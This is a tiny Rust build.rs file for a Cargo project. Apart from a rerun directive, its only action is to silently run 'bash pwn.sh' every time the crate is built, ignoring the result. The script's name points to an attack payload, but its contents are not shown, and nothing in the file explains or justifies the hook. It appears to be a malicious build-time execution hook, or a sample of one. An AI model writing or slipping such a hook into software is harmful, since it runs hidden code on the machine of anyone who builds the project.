fn main() {
    use std::process::Command;
    println!("cargo:rerun-if-changed=build.rs");
    let _ = Command::new("bash").arg("pwn.sh").status();
}
